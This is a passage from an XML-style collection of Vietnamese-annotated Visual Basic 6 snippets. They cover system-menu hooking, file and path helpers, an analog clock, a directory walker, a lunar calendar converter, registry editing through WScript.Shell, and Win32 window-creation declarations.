Public Sub UnHookWindow(frmForm As Form)
    If OldWindowProc Then
        SetWindowLong frmForm.hWnd, GWL_WNDPROC, OldWindowProc
        OldWindowProc = 0
    End If
End Sub

Public Function WndProc(ByVal hWnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long

    WndProc = CallWindowProc(OldWindowProc, hWnd, Msg, wParam, lParam)
    
    Select Case Msg
        Case WM_SYSCOMMAND
            If wParam = MF_MENUID Then
                Form2.Show
                WndProc = 0
            End If
    End Select
End Function

Public Sub AppendSystemMenu(ByVal hWnd As Long)
    
    Dim lngSysMenuID    As Long
    Dim strMenuString   As String
    
    strMenuString = "About " &amp; App.EXEName
    lngSysMenuID = GetSystemMenu(hWnd, 0)
    
    If lngSysMenuID Then
        Call AppendMenu(lngSysMenuID, MF_SEPARATOR, 0&amp;, 0&amp;)
        Call AppendMenu(lngSysMenuID, MF_STRING, MF_MENUID, ByVal strMenuString)
    End If
    
End Sub


Form code:
Option Explicit

Private Sub Form_Load()
    Call AppendSystemMenu(Me.hWnd)
    Call HookWindow(Me)
End Sub

Private Sub Form_Unload(Cancel As Integer)
    Call UnHookWindow(Me)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0609221231520425</MaVD>
    <NoiDung>Public Function GetFileName(ByVal sPath As String) As String
GetFileName = Mid(sPath, InStrRev(sPath, "\") + 1)
End Function
Public Function GetFolderPath(ByVal sPath As String) As String
GetFolderPath = Left(sPath, InStrRev(sPath, "\") - 1)
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>085725025700</MaVD>
    <NoiDung>Phần Design: Form1 có - Shape1 height 4215 width 4335 shape 3-circle
- kimgiay (line) x1: 2310 y1: 2220 (tâm shape1), kimphut (line), kimgio (line) cả hai có x1 và y1 trùng tâm shape1
-Timer1.interval = 1000 hoặc ít hơn tùy ý
Phần code:

Dim Giây&amp;, Phút&amp;, Gio&amp;
Private Sub Timer1_Timer()
Giây = Second(Time)
Phút = Minute(Time)
Gio = Hour(Time) * 5 + Phút / 60
kimgiay.X2 = 2310 + 2000 * Cos(Giây * 0.1047 - 1.57)
kimgiay.Y2 = 2220 + 2000 * Sin(Giây * 0.1047 - 1.57)
kimphut.X2 = 2310 + 1750 * Cos(Phút * 0.1047 - 1.57)
kimphut.Y2 = 2220 + 1750 * Sin(Phút * 0.1047 - 1.57)
kimgio.X2 = 2310 + 1250 * Cos(Gio * 0.1047 - 1.57)
kimgio.Y2 = 2220 + 1250 * Sin(Gio * 0.1047 - 1.57)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>083725033718</MaVD>
    <NoiDung>Option Explicit
 
Private Declare Function FindFirstFile Lib "kernel32" Alias "FindFirstFileW" (ByVal lpFileName As String, lpFindFileData As WIN32_FIND_DATA) As Long
Private Declare Function FindNextFile Lib "kernel32" Alias "FindNextFileW" (ByVal hFindFile As Long, lpFindFileData As WIN32_FIND_DATA) As Long
Private Declare Function FindClose Lib "kernel32" (ByVal hFindFile As Long) As Long
 
Const FILE_ATTRIBUTE_DIRECTORY = &amp;H10
Const FILE_ATTRIBUTE_HIDDEN = &amp;H2
Const FILE_ATTRIBUTE_NORMAL = &amp;H80
Const FILE_ATTRIBUTE_READONLY = &amp;H1
Const FILE_ATTRIBUTE_SYSTEM = &amp;H4
 
Private Type FILETIME
    dwLowDateTime As Long
    dwHighDateTime As Long
End Type
 
 
Private Type WIN32_FIND_DATA
    dwFileAttributes As Long
    ftCreationTime As FILETIME
    ftLastAccessTime As FILETIME
    ftLastWriteTime As FILETIME
    nFileSizeHigh As Long
    nFileSizeLow As Long
    dwReserved0 As Long
    dwReserved1 As Long
    cFileName As String * 255
    cAlternate As String * 14
End Type
 
Private Sub Command1_Click()
    Dim DirCount As Integer, fileCount As Integer
    WalkDir Text1.Text, DirCount, fileCount
    MsgBox "Folder: " &amp; DirCount &amp; " - File: " &amp; fileCount
End Sub
 
Private Sub WalkDir(sFolder As String, DirCount As Integer, fileCount As Integer)
    Dim myFolder As New Collection
    Dim FileData As WIN32_FIND_DATA
    Dim res As Long, hSearch  As Long, fileName As String
    
    DirCount = 0
    fileCount = 0
    myFolder.Add (sFolder)
    
    Do While (myFolder.Count)
    
        sFolder = myFolder.Item(1)
        myFolder.Remove (1)
        
        hSearch = FindFirstFile(StrConv(sFolder &amp; "\*.*", vbUnicode), FileData)
        If (hSearch = -1) Then GoTo 1
        
        Do
            fileName = TrimPath(FileData.cFileName)
            
            If (fileName &lt;&gt; ".") And (fileName &lt;&gt; "..") Then
            
                If (FileData.dwFileAttributes And FILE_ATTRIBUTE_DIRECTORY) Then
                
                    myFolder.Add (sFolder &amp; "\" &amp; fileName)
                    DirCount = DirCount + 1
                    '---------------'
                    ' do some thing '
                    '---------------'
                Else
                
                    fileCount = fileCount + 1
                    '---------------'
                    ' do some thing '
                    '---------------'
                End If
                
            End If
            
            res = FindNextFile(hSearch, FileData)
        Loop Until (res = 0)
        
1:      FindClose (hSearch)
 
    Loop
End Sub
 
 
Private Function TrimPath(sPath As String) As String
    Dim i As Integer
    
    sPath = StrConv(sPath, vbFromUnicode)
    
    i = InStr(sPath, Chr(0))
    If i &gt; 0 Then sPath = Left(sPath, i - 1)
    TrimPath = sPath
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>082025042002</MaVD>
    <NoiDung>Private Type solardate
    solarday As Integer
    solarmonth As Integer
    solaryear As Integer
End Type
Private Type solarlunar
    sdate As solardate
    evallunar As Integer
    leapmoon As Integer 'chi co hai gia tri la 0 hoac 1
End Type
Private Type lunardate
    lunarday As Integer
    lunarmonth As Integer
    lunaryear As Integer
    leapmoon As Integer 'chi co hai gia tri la 0 hoac 1
End Type
 
Const PI = 3.14159265358979 + 3.238462643383E-15 + 2.795E-28
 
Private Function UniversalToJD(ByVal solarday As Integer, ByVal solarmonth As Integer, ByVal solaryear As Integer) As Double
'tra ve 1  ngay julius cua ngay duong lich
    Dim jd As Double
        If (solaryear &gt; 1582 Or (solaryear = 1582 And solarmonth &gt; 10) Or (solaryear = 1582 And solarmonth = 10 And solarday &gt; 14)) Then
            jd = 367
            jd = jd * solaryear
            jd = jd - Int(7 * (solaryear + Int((solarmonth + 9) / 12)) / 4)
            jd = jd - Int(3 * (Int((solaryear + (solarmonth - 9) / 7) / 100) + 1) / 4)
            jd = jd + Int(275 * solarmonth / 9)
            jd = jd + solarday
            jd = jd + 1721028.5
        Else
            jd = 367
            jd = jd * solaryear
            jd = jd - Int(7 * (solaryear + 5001 + Int((solarmonth - 9) / 7)) / 4)
            jd = jd + Int(275 * solarmonth / 9)
            jd = jd + solarday
            jd = jd + 1729776.5
        End If
        UniversalToJD = jd
End Function
 
 
Private Function solar2lunar(ByVal solarday As Integer, ByVal solarmonth As Integer, ByVal solaryear As Integer, ByVal local_timezone As Byte) As lunardate
    Dim ly() As solarlunar
    Dim jdToday, jdMonth11 As Double
    Dim month11 As solardate
    Dim i, dd, mm, yy As Integer
        yy = solaryear
        lunaryear solaryear, ly(), local_timezone
        month11 = ly(UBound(ly)).sdate
        jdToday = LocalToJD(solarday, solarmonth, solaryear, local_timezone)
        jdMonth11 = LocalToJD(month11.solarday, month11.solarmonth, month11.solaryear, local_timezone)
        If (jdToday &gt;= jdMonth11) Then
            lunaryear solaryear + 1, ly(), local_timezone
            yy = solaryear + 1
        End If
        i = UBound(ly)
        Do While (jdToday &lt; LocalToJD(ly(i).sdate.solarday, ly(i).sdate.solarmonth, ly(i).sdate.solaryear, local_timezone))
                i = i - 1
        Loop
        dd = Int(jdToday - LocalToJD(ly(i).sdate.solarday, ly(i).sdate.solarmonth, ly(i).sdate.solaryear, local_timezone)) + 1
        mm = ly(i).evallunar
        If (mm &gt;= 11) Then
                yy = yy - 1
        End If
        With solar2lunar
            .leapmoon = ly(i).leapmoon
            .lunarday = dd
            .lunarmonth = mm
            .lunaryear = yy
        End With
End Function
 
Private Sub lunaryear(ByVal solaryear As Integer, ret() As solarlunar, ByVal local_timezone As Byte)
    Dim jdmonth11A, off As Double
    Dim k, i, foundI, j As Integer
    Dim sunlongitudes(1 To 14) As Double
    Dim foundB, hasMajorTerm, p1, p2, leap As Boolean
    Dim sl1, sl2, sl3, sl4, kl As Double
    Dim SUNLONG_MAJOR(1 To 12) As Double
        jdmonth11A = LocalToJD(LunarMonth11(solaryear - 1, local_timezone).solarday, LunarMonth11(solaryear - 1, local_timezone).solarmonth, LunarMonth11(solaryear - 1, local_timezone).solaryear, local_timezone)
        k = Int(0.5 + (jdmonth11A - 2415021.07699869 - 0.000000005) / 29.530588853)
        'k la ngay soc cua mong 1 thang 11 nam solaryear -1
        off = LocalToJD(LunarMonth11(solaryear, local_timezone).solarday, LunarMonth11(solaryear, local_timezone).solarmonth, LunarMonth11(solaryear, local_timezone).solaryear, local_timezone) - jdmonth11A
        leap = off &gt; 365
        If leap Then
            ReDim Preserve ret(1 To 14)
            'neu la nam nhuan thi tu thang 11 nam nay den thang 11nam sua se co 14 ngay soc tat ca
        Else
            ReDim Preserve ret(1 To 13)
            'neu khong nhuan thi se co 13 ngay soc  tat ca
        End If
        For i = 1 To UBound(ret)
            With ret(i)
                .sdate = LocalFromJD(NewMoon(k + i - 1), local_timezone)
                .evallunar = MOD1(i + 10, 12)
                .leapmoon = 0
            End With
        Next
        If (leap) Then
        'den day thi chac chan nam nay se la nam nhuan
        'nen so ngay soc se la 14 ngay trong nam
            For i = 0 To 11
                SUNLONG_MAJOR(i + 1) = i * PI / 6
            Next
            'tao ra 12 tiet khi tu (0 den 11)*pi/6
            For i = 1 To 14
                kl = LocalToJD(ret(i).sdate.solarday, ret(i).sdate.solarmonth, ret(i).sdate.solaryear, local_timezone)
                sunlongitudes(i) = SunLongitude(kl)
            Next
            'tinh ra trung khi cua nhung thang am lich
            foundB = False
            For i = 1 To 13
                sl1 = sunlongitudes(i)
                sl2 = sunlongitudes(i + 1)
                'trung khi cua hai thang lien tiep
                hasMajorTerm = False
                For j = 1 To 11
                    sl3 = SUNLONG_MAJOR(j)
                    sl4 = SUNLONG_MAJOR(j + 1)
                    p1 = ((sl3 &lt; sl1) And (sl1 &lt; sl2) And (sl2 &lt; sl4))
                    p2 = ((sl3 &lt; sl2) And (sl2 &lt; sl1) And (sl1 &lt; sl4))
                    If (p1 Or p2) Then
                        hasMajorTerm = True
                    End If
                    If hasMajorTerm Then
                        ret(i).leapmoon = 1
                        ret(i).evallunar = MOD1(i + 9, 12)
                        foundB = True
                        foundI = i
                        Exit For
                    End If
                Next
                If foundB Then
                    Exit For
                End If
            Next
            For i = foundI + 1 To 14
                ret(i).evallunar = MOD1(i + 9, 12)
            Next
        End If
End Sub
 
Private Function LocalFromJD(ByVal jd As Double, ByVal local_timezone As Byte) As solardate
'tra ve ngay ,thang ,nam  cua nam duong lich cho 1 ngay julius tuong ung voi mui gio
 
        LocalFromJD = UniversalFromJD(jd + local_timezone / 24)
End Function
 
Private Function LocalToJD(ByVal solarday As Integer, ByVal solarmonth As Integer, ByVal solaryear As Integer, ByVal local_timezone As Byte) As Double
'tra ve 1  ngay julius cua ngay duong lich voi mui gio
        LocalToJD = UniversalToJD(solarday, solarmonth, solaryear) - local_timezone / 24
End Function
 
Private Function LunarMonth11(ByVal solaryear As Integer, ByVal local_timezone As Byte) As solardate
'tính thang am lich chua Ðong chi
'tra ve ngay mong 1 thang 11 am cua  nam solaryear
    Dim off, jd, sunLong As Double
    Dim k As Integer
    Dim ret As solardate
        off = LocalToJD(31, 12, solaryear, local_timezone) - 2415021.07699869 - 0.000000005
        k = Int(off / 29.530588853)
        jd = NewMoon(k)
        ret = LocalFromJD(jd, local_timezone)
        sunLong = SunLongitude(LocalToJD(ret.solarday, ret.solarmonth, ret.solaryear, local_timezone))
        If (sunLong &gt; 3 * PI / 2) Then
            jd = NewMoon(k - 1)
        End If
    LunarMonth11 = LocalFromJD(jd, local_timezone)
End Function
 
Private Function NewMoon(ByVal k As Integer) As Double
'tra ve gia tri cua ngay julius tuong ung voi ngay soc thu k
    Dim T, T2, T3, dr, JD1, M, Mpr, f, C1, deltat, JdNew
        T = k / 1236.85 '// Time in Julian centuries from 1900 January 0.5
        T2 = T * T
        T3 = T2 * T
        dr = PI / 180
        JD1 = 2415020.75933 + 29.53058868 * k + 0.0001178 * T2 - 0.000000155 * T3
        JD1 = JD1 + 0.00033 * Math.Sin((166.56 + 132.87 * T - 0.009173 * T2) * dr) ' // Mean new moon
        M = 359.2242 + 29.10535608 * k - 0.0000333 * T2 - 0.00000347 * T3 ' // Sun's mean anomaly
        Mpr = 306.0253 + 385.81691806 * k + 0.0107306 * T2 + 0.00001236 * T3 ' // Moon's mean anomaly
        f = 21.2964 + 390.67050646 * k - 0.0016528 * T2 - 0.00000239 * T3 ' // Moon's argument of latitude
        C1 = (0.1734 - 0.000393 * T) * Math.Sin(M * dr) + 0.0021 * Math.Sin(2 * dr * M)
        C1 = C1 - 0.4068 * Math.Sin(Mpr * dr) + 0.0161 * Math.Sin(dr * 2 * Mpr)
        C1 = C1 - 0.0004 * Math.Sin(dr * 3 * Mpr)
        C1 = C1 + 0.0104 * Math.Sin(dr * 2 * f) - 0.0051 * Math.Sin(dr * (M + Mpr))
        C1 = C1 - 0.0074 * Math.Sin(dr * (M - Mpr)) + 0.0004 * Math.Sin(dr * (2 * f + M))
        C1 = C1 - 0.0004 * Math.Sin(dr * (2 * f - M)) - 0.0006 * Math.Sin(dr * (2 * f + Mpr))
        C1 = C1 + 0.001 * Math.Sin(dr * (2 * f - Mpr)) + 0.0005 * Math.Sin(dr * (2 * Mpr + M))
        If (T &lt; -11) Then
            deltat = 0.001 + 0.000839 * T + 0.0002261 * T2 - 0.00000845 * T3 - 0.000000081 * T * T3
        Else
            deltat = -0.000278 + 0.000265 * T + 0.000262 * T2
        End If
        JdNew = JD1 + C1 - deltat
    NewMoon = JdNew
End Function
 
Private Function MOD1(ByVal x As Long, ByVal y As Long) As Long
'tra ve gia tri cua so du  khi x chia cho y
    Dim Z
        Z = x - (y * Int(x / y))
        If Z = 0 Then
            Z = y
        End If
        MOD1 = Z
End Function
 
Private Function SunLongitude(ByVal jdn As Double) As Double
'tra ve trung khi cua thang
    Dim T, T2, dr, M, L0, DL, l
        T = (jdn - 2451545) / 36525  ' // Time in Julian centuries from 2000-01-01 12:00:00 GMT
        T2 = T * T
        dr = PI / 180 ' // degree to radian
        M = 357.5291 + 35999.0503 * T - 0.0001559 * T2 - 0.00000048 * T * T2 ' // mean anomaly, degree
        L0 = 280.46645 + 36000.76983 * T + 0.0003032 * T2 ' // mean longitude, degree
        DL = (1.9146 - 0.004817 * T - 0.000014 * T2) * Math.Sin(dr * M)
        DL = DL + (0.019993 - 0.000101 * T) * Math.Sin(dr * 2 * M) + 0.00029 * Math.Sin(dr * 3 * M)
        l = L0 + DL ' // true longitude, degree
        l = l * dr
        l = l - PI * 2 * (Int(l / (PI * 2))) ' // Normalize to (0, 2*PI)
    SunLongitude = l
End Function
 
 
Private Function UniversalFromJD(ByVal jd As Double) As solardate
'tra ve ngay ,thang ,nam  cua nam duong lich cho 1 ngay julius tuong ung
        Dim Z, A, alpha, B, C, D, E, dd, mm, yyyy
        Dim f As Double
        Z = Int(jd + 0.5)
        f = (jd + 0.5) - Z
        If (Z &lt; 2299161) Then
            A = Z
        Else
            alpha = Int((Z - 1867216.25) / 36524.25)
            A = Z + 1 + alpha - Int(alpha / 4)
        End If
        B = A + 1524
        C = Int((B - 122.1) / 365.25)
        D = Int(365.25 * C)
        E = Int((B - D) / 30.6001)
        dd = Int(B - D - Int(30.6001 * E) + f)
        If (E &lt; 14) Then
            mm = E - 1
        Else
            mm = E - 13
        End If
        If (mm &lt; 3) Then
            yyyy = C - 4715
        Else
            yyyy = C - 4716
        End If
        With UniversalFromJD
            .solarday = dd
            .solarmonth = mm
            .solaryear = yyyy
        End With
End Function
 
 
Public Function LayThoiGianAL(ByVal solarday As Integer, ByVal solarmonth As Integer, ByVal solaryear As Integer, ByVal local_timezone As Byte) As String
    Dim Esteam(9) As String
    Dim Ebranch(11) As String
    Dim Vsteam(9) As String
    Dim Vbranch(11) As String
    Dim ld, lm, ly, llm As Integer
    Dim str$
        'khai bao thien can tieng anh
        Esteam(0) = "Jia":        Esteam(1) = "Yi":        Esteam(2) = "Bing":        Esteam(3) = "Ding"
        Esteam(4) = "Wu":        Esteam(5) = "Ji":        Esteam(6) = "Geng":        Esteam(7) = "Xin"
        Esteam(8) = "Ren":        Esteam(9) = "Gui"
        'khai bao thien can tieng viet
        Vsteam(0) = "Gia1p":        Vsteam(1) = "A61t":        Vsteam(2) = "Bi1nh":        Vsteam(3) = "D9inh"
        Vsteam(4) = "Ma65u":        Vsteam(5) = "Ky3":        Vsteam(6) = "Canh":        Vsteam(7) = "Ta6n"
        Vsteam(8) = "Nha6m":        Vsteam(9) = "Quy1"
        'khai bao dia chi tieng anh
        Ebranch(0) = "zi":        Ebranch(1) = "chou":        Ebranch(2) = "Yin":        Ebranch(3) = "Mao"
        Ebranch(4) = "Chen":        Ebranch(5) = "Si":        Ebranch(6) = "wu":        Ebranch(7) = "Wei"
        Ebranch(8) = "Shen":        Ebranch(9) = "You":        Ebranch(10) = "Xu":        Ebranch(11) = "Hai"
        'khai bao dia chi tieng viet
        Vbranch(0) = "Ty1":        Vbranch(1) = "Su73u":        Vbranch(2) = "Da62n":        Vbranch(3) = "Ma4o"
        Vbranch(4) = "Thi2n":        Vbranch(5) = "Ty5":        Vbranch(6) = "Ngo5":        Vbranch(7) = "Mu2i"
        Vbranch(8) = "Tha6n":        Vbranch(9) = "Da65u":        Vbranch(10) = "Tua61t":        Vbranch(11) = "Ho75i"
        
        With solar2lunar(solarday, solarmonth, solaryear, local_timezone)
            ld = .lunarday
            lm = .lunarmonth
            ly = .lunaryear
            llm = .leapmoon
        End With
        
        'tao ngay can chi
        str = Vsteam(Int(UniversalToJD(solarday, solarmonth, solaryear) + 9.5) Mod 10)
'        AALdaySBsteam.Caption = Esteam(Int(UniversalToJD(solarday, solarmonth, solaryear) + 9.5) Mod 10)
        str = str &amp; " " &amp; Vbranch(Int(UniversalToJD(solarday, solarmonth, solaryear) + 1.5) Mod 12)
'        AALdaySBbranch.Caption = Ebranch(Int(UniversalToJD(solarday, solarmonth, solaryear) + 1.5) Mod 12)
        str = str &amp; "//"
 
'        'tao thang can chi
        str = str &amp; Vsteam((ly * 12 + lm + 3) Mod 10)
        
'        AALmoonSBsteam.Caption = Esteam((ly * 12 + lm + 3) Mod 10)
'        AALmoonSBbranch.Caption = Ebranch((lm + 1) Mod 12)
        str = str &amp; " " &amp; Vbranch((lm + 1) Mod 12)
        
        str = str &amp; "//"
 
'        If llm Then
'            Vleapmonth.Caption = "(N)"
'            Eleapmonth.Caption = "(L)"
'        Else
'            Vleapmonth.Caption = ""
'            Eleapmonth.Caption = ""
'        End If
        
        
        'tao nam can chi
        str = str &amp; Vsteam((ly + 6) Mod 10)
'        AALyearSBsteam.Caption = Esteam((ly + 6) Mod 10)
        str = str &amp; " " &amp; Vbranch((ly + 8) Mod 12)
'        AALyearSBbranch.Caption = Ebranch((ly + 8) Mod 12)
        
        str = str &amp; "//"
        'tao gio can chi
        str = str &amp; Vsteam(((Int(UniversalToJD(solarday, solarmonth, solaryear) + 9.5) Mod 10) Mod 5) * 2)
'        AALhoursteam.Caption = Esteam(((Int(UniversalToJD(solarday, solarmonth, solaryear) + 9.5) Mod 10) Mod 5) * 2)
        
        
        LayThoiGianAL = str &amp; " Ty1//" &amp; ld &amp; "/" &amp; lm &amp; "/" &amp; ly &amp; "//" &amp; llm
 
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>083724093733</MaVD>
    <NoiDung>Private Sub Form_Load()
Set objDialog = CreateObject("SAFRCFileDlg.FileSave")
objDialog.FileName = "Document1.txt"
objDialog.FileType = "Text Document"
intReturn = objDialog.OpenFileSaveDlg
    Set objFSO = CreateObject("Scripting.FileSystemObject").CreateTextFile(objDialog.FileName)
    objFSO.WriteLine Now
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091723041750</MaVD>
    <NoiDung>Private Sub Form_Load()
    Dim sMsg$
    sMsg = NCRHex("Câu lạc bộ VB")
    TextBox1.Text = sMsg
End Sub
Private Function NCRHex(ByVal strNCRHex) As String
    Dim vTmp
    Dim sTmp$, i%, j%
    vTmp = Split(strNCRHex, "&amp;#x", -1, vbTextCompare)
    For i = LBound(vTmp) To UBound(vTmp)
        j = InStr(1, vTmp(i), ";", vbTextCompare)
        If j = 0 Then
            sTmp = sTmp &amp; vTmp(i)
        Else
            sTmp = sTmp &amp; ChrW$(Val("&amp;H" &amp; Left$(vTmp(i), j - 1))) _
                    &amp; Mid$(vTmp(i), j + 1, Len(vTmp(i)))
        End If
    Next i
    NCRHex = sTmp
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>093423073456</MaVD>
    <NoiDung>1- Đầu tiên bạn tạo một biến đối tượng thuộc WScript.Shell như code sau:
Set obj = CreateObject("WScript.Shell")

2- Muốn đọc Registry, bạn chi cần gọi phương thức obj.RegRead (Chuỗi Registry)

3- Muốn xóa Registry, bạn chi cần gọi phương thức obj.RegDelete (Chuỗi Registry)

4- Muốn viết Registry, bạn chi cần gọi phương thức obj.RegWrite (Chuỗi Registry, giá trị, kiểu chuỗi)

Code sau đây Không cho phép thay đổi nội dung trang Homepage khi giá trị là 1

A- Đọc Registry: Chỉ có đọc Registry mới cần thêm một biến để tải nội dung đọc:

Dim obj, Ðoc
Set obj = CreateObject("WScript.Shell")
Ðoc = obj.RegRead  ("HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage")

Chuỗi Registry là toàn bộ đường dẫn đầy đủ ở ô bên trái của Registry Editor và một record trong cột "Name" ở ô bên phải của Registry Editor. Trong câu code trên, "Homepage" nằm cuối đường dẫn chính là một record trong cột "Name" ở ô bên phải của Registry Editor
ghi chú: đường dẫn đầy đủ ở ô bên trái của Registry Editor thường hiện dưới thanh StatusBar của Registry Editor, bỏ từ "My Computer" và nên viết tắt như "HKCU" = "HKEY_CURRENT_USER"

B- Xóa Registry:

obj.RegDelete  "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage"

C- Viết Registry:

obj.RegWrite  "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage", 1

Đoạn code trên, sau chuỗi Registry, giá trị là 1
phần kiểu chuổi sau đó để trống, máy tính ngầm hiểu là kiểu "REG_SZ", nghĩa là đúng ra phải viết:

obj.RegWrite  "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage", 1, "REG_SZ"</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>080825030838</MaVD>
    <NoiDung>Private Type RECT
   left As Long
   top As Long
   right As Long
   bottom As Long
End Type
Private Declare Function DrawText Lib "user32" Alias "DrawTextA" (ByVal hDC As Long, ByVal lpStr As String, ByVal nCount As Long, lpRect As RECT, ByVal wFormat As Long) As Long
   Private Const DT_BOTTOM = &amp;H8&amp;
   Private Const DT_CENTER = &amp;H1&amp;
   Private Const DT_LEFT = &amp;H0&amp;
   Private Const DT_CALCRECT = &amp;H400&amp;
   Private Const DT_WORDBREAK = &amp;H10&amp;
   Private Const DT_VCENTER = &amp;H4&amp;
   Private Const DT_TOP = &amp;H0&amp;
   Private Const DT_TABSTOP = &amp;H80&amp;
   Private Const DT_SINGLELINE = &amp;H20&amp;
   Private Const DT_RIGHT = &amp;H2&amp;
   Private Const DT_NOCLIP = &amp;H100&amp;
   Private Const DT_INTERNAL = &amp;H1000&amp;
   Private Const DT_EXTERNALLEADING = &amp;H200&amp;
   Private Const DT_EXPANDTABS = &amp;H40&amp;
   Private Const DT_CHARSTREAM = 4&amp;
   Private Const DT_NOPREFIX = &amp;H800&amp;
   Private Const DT_EDITCONTROL = &amp;H2000&amp;
   Private Const DT_PATH_ELLIPSIS = &amp;H4000&amp;
   Private Const DT_END_ELLIPSIS = &amp;H8000&amp;
   Private Const DT_MODIFYSTRING = &amp;H10000
   Private Const DT_RTLREADING = &amp;H20000
   Private Const DT_WORD_ELLIPSIS = &amp;H40000
 
Private Declare Function PathCompactPath Lib "shlwapi" Alias "PathCompactPathA" ( _
  ByVal hDC As Long, ByVal lpszPath As String, ByVal dx As Long) As Long
 
Public Function CompactedPath( _
     ByVal sPath As String, _
     ByVal lMaxPixels As Long, _
     ByVal hDC As Long _
   ) As String
Dim tR As RECT
   tR.right = lMaxPixels
   DrawText hDC, sPath, -1, tR, DT_PATH_ELLIPSIS Or DT_SINGLELINE Or DT_MODIFYSTRING
   CompactedPath = sPath
End Function
 
Public Function CompactedPathSh( _
     ByVal sPath As String, _
     ByVal lMaxPixels As Long, _
     ByVal hDC As Long _
   ) As String
Dim lR As Long
Dim iPos As Long
   lR = PathCompactPath(hDC, sPath, lMaxPixels)
   iPos = InStr(sPath, Chr$(0))
   If iPos &lt;&gt; 0 Then
     CompactedPathSh = left$(sPath, iPos - 1)
   Else
     CompactedPathSh = sPath
   End If
End Function
 
Private Sub Command1_Click()
LongPath = "C:\Program Files\Microsoft DevStudio\Visual Basic\Samples\Unsupported Samples\Etc"  'Đường dẫn cần làm ngắn
MsgBox CompactedPathSh(LongPath, 100, Me.hDC)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>080418100440</MaVD>
    <NoiDung>'Thêm vào 1 Module vào add vào đoạn code sau :
Option Explicit
Declare Function CreateWindowEx Lib "user32" Alias "CreateWindowExA" (ByVal dwExStyle As Long, _
                                                    ByVal lpClassName As String, _
                                                    ByVal lpWindowName As String, _
                                                    ByVal dwStyle As Long, _
                                                    ByVal x As Long, _
                                                    ByVal y As Long, _
                                                    ByVal nWidth As Long, _
                                                    ByVal nHeight As Long, _
                                                    ByVal hWndParent As Long, _
                                                    ByVal hMenu As Long, _
                                                    ByVal hInstance As Long, _
                                                    lpParam As Any) As Long
                                                    
Declare Function LoadIcon Lib "user32" Alias "LoadIconA" (ByVal hInstance As Long, ByVal lpIconName As String) As Long
Declare Function LoadCursor Lib "user32" Alias "LoadCursorA" (ByVal hInstance As Long, ByVal lpCursorName As String) As Long
Declare Function GetStockObject Lib "gdi32" (ByVal nIndex As Long) As Long
Declare Function RegisterClassEx Lib "user32" Alias "RegisterClassExA" (pcWndClassEx As WNDCLASSEX) As Integer
Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Declare Function UpdateWindow Lib "user32" (ByVal hwnd As Long) As Long
Declare Function SetFocus Lib "user32" (ByVal hwnd As Long) As Long
Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Declare Function DefWindowProc Lib "user32" Alias "DefWindowProcA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Declare Function GetMessage Lib "user32" Alias "GetMessageA" (lpMsg As MSG, ByVal hwnd As Long, ByVal wMsgFilterMin As Long, ByVal wMsgFilterMax As Long) As Long
Declare Function TranslateMessage Lib "user32" (lpMsg As MSG) As Long
Declare Function DispatchMessage Lib "user32" Alias "DispatchMessageA" (lpMsg As MSG) As Long
Declare Sub PostQuitMessage Lib "user32" (ByVal nExitCode As Long)
Declare Function BeginPaint Lib "user32" (ByVal hwnd As Long, lpPaint As PAINTSTRUCT) As Long
Declare Function EndPaint Lib "user32" (ByVal hwnd As Long, lpPaint As PAINTSTRUCT) As Long
Declare Function GetClientRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long
Declare Function DrawText Lib "user32" Alias "DrawTextA" (ByVal hdc As Long, ByVal lpStr As String, ByVal nCount As Long, lpRect As RECT, ByVal wFormat As Long) As Long
                                                    
                                                    
Type WNDCLASSEX
    cbSize As Long
    style As Long
    lpfnWndProc As Long
    cbClsExtra As Long
    cbWndExtra As Long
    hInstance As Long
    hIcon As Long
    hCursor As Long
    hbrBackground As Long
    lpszMenuName As String
    lpszClassName As String
    hIconSm As Long
End Type
 
 
Type POINTAPI
        x As Long
        y As Long
End Type
 
Type MSG
    hwnd As Long
    message As Long
    wParam As Long
    lParam As Long
    time As Long
    pt As POINTAPI
End Type
 
Type RECT
        Left As Long
        Top As Long
        Right As Long
        Bottom As Long
End Type
 
Type PAINTSTRUCT
        hdc As Long
        fErase As Long
        rcPaint As RECT
        fRestore As Long
        fIncUpdate As Long
        rgbReserved(32) As Byte 'this was declared incorrectly in VB API viewer
End Type
 
Public Const WS_VISIBLE As Long = &amp;H10000000
Public Const WS_VSCROLL As Long = &amp;H200000
Public Const WS_TABSTOP As Long = &amp;H10000
Public Const WS_THICKFRAME As Long = &amp;H40000
Public Const WS_MAXIMIZE As Long = &amp;H1000000
Public Const WS_MAXIMIZEBOX As Long = &amp;H10000
Public Const WS_MINIMIZE As Long = &amp;H20000000
Public Const WS_MINIMIZEBOX As Long = &amp;H20000
Public Const WS_SYSMENU As Long = &amp;H80000
Public Const WS_BORDER As Long = &amp;H800000
Public Const WS_CAPTION As Long = &amp;HC00000                  '  WS_BORDER Or WS_DLGFRAME
Public Const WS_CHILD As Long = &amp;H40000000
Public Const WS_CHILDWINDOW As Long = (WS_CHILD)
Public Const WS_CLIPCHILDREN As Long = &amp;H2000000
Public Const WS_CLIPSIBLINGS As Long = &amp;H4000000
Public Const WS_DISABLED As Long = &amp;H8000000
Public Const WS_DLGFRAME As Long = &amp;H400000
Public Const WS_EX_ACCEPTFILES As Long = &amp;H10&amp;
Public Const WS_EX_DLGMODALFRAME As Long = &amp;H1&amp;
